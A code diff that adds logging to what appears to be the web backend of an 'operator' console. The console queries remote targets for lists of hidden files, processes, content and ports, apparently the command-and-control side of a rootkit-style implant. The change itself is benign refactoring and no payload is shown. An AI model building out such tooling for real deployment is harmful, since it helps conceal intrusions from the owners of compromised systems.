@@ -13,10 +13,13 @@ import time
 from pathlib import Path
 from typing import TYPE_CHECKING, Callable
 
+import logging
 from aiohttp import web
 
 if TYPE_CHECKING:
     from lib.operator.server import Target, TargetManager
+
+log = logging.getLogger("operator")
 
 HTTP_PORT = 8080
 
@@ -33,6 +36,8 @@ def _enum_indexed(t: Target, cmd: str, prefix: str,
     try:
         reply = t.exchange(cmd)
         if not reply.startswith(f"{prefix} "):
+            log.warning("enum %s: unexpected reply %r (want prefix %r)",
+                        cmd, reply, prefix)
             return []
         count = min(int(reply.split()[1]), limit)
         results = []
@@ -42,7 +47,8 @@ def _enum_indexed(t: Target, cmd: str, prefix: str,
             if item is not None:
                 results.append(item)
         return results
-    except Exception:
+    except Exception as e:
+        log.warning("enum %s failed: %s", cmd, e)
         return []
 
 
@@ -92,10 +98,16 @@ def _target_summary(t: Target) -> dict:
 def _target_detail(t: Target) -> dict:
     """Full target dict including hidden item lists (on-demand only)."""
     d = _target_summary(t)
-    d["hidden"] = {
-        cat: _enum_indexed(t, f"LIST {cat.upper()}", "LIST", _parse_entry)
-        for cat in ("file", "pid", "content", "port")
-    } if t.online else {}
+    if t.online:
+        hidden = {}
+        for cat in ("file", "pid", "content", "port"):
+            items = _enum_indexed(t, f"LIST {cat.upper()}", "LIST", _parse_entry)
+            hidden[cat] = items
+        d["hidden"] = hidden
+        log.debug("detail %s: hidden_lens=%s",
+                  t.id, {k: len(v) for k, v in hidden.items()})
+    else:
+        d["hidden"] = {}
     return d
 
 
@@ -159,6 +171,7 @@ async def _watch_target(ws: web.WebSocketResponse, target_id: str,
 
 async def _ws_handle_watch(ws, data, loop, state):
     tid = data.get("target")
+    log.debug("watch request: target=%s", tid)
     if state["watch_cancel"]:
         state["watch_cancel"].set()
     if state["watch_task"]:
